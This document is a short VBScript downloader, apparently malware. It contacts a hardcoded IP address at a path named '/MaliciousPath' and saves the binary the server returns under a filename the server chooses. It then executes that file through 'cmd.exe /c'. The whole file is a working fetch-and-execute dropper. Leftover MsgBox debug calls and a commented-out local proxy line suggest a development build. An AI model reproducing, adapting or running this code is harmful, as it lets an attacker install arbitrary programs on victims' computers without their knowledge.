Public SERVERADDRESS
SERVERADDRESS = "http://104.237.4.83"
Public CONFIGURATIONPATH
CONFIGURATIONPATH = "/Configuration"
Public HEADERS
HEADERS = "5a968c26-b565-4b65-8445-9e87780cb8f9-01"
Public COMMANDSTOEXE
Public MALICIOUSURL
MALICIOUSURL = "/MaliciousPath"
Public HttpGetRequestVar
Public DownloadFileFromServerVar

Dim path
'Call writeBinary("aaaa","main.exe")

Dim http
Set http = CreateObject("Msxml2.ServerXMLHTTP")
http.Open "GET", SERVERADDRESS+MALICIOUSURL , False
http.setRequestHeader "UUID",HEADERS
'http.setProxy 2, "127.0.0.1:8080", ""
http.send
Dim response(2)
If http.Status = 200 Then
	response(0) = http.getResponseHeader("Filename")
	response(1) = http.responseBody
End If
HttpGetRequestVar = response

Dim FileName,BinaryCodeToExe
FileName = HttpGetRequestVar(0)
BinaryCodeToExe = HttpGetRequestVar(1)
MsgBox(FileName)
MsgBox(BinaryCodeToExe)
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2

'Create Stream object
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")

'Specify stream type - we want To save binary data.
BinaryStream.Type = adTypeBinary

'Open the stream And write binary data To the object
BinaryStream.Open
BinaryStream.Write BinaryCodeToExe

'Save binary data To disk
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
DownloadFileFromServerVar = FileName

Set oShell = CreateObject ("WScript.Shell") 
oShell.run "cmd.exe /c " + DownloadFileFromServerVar

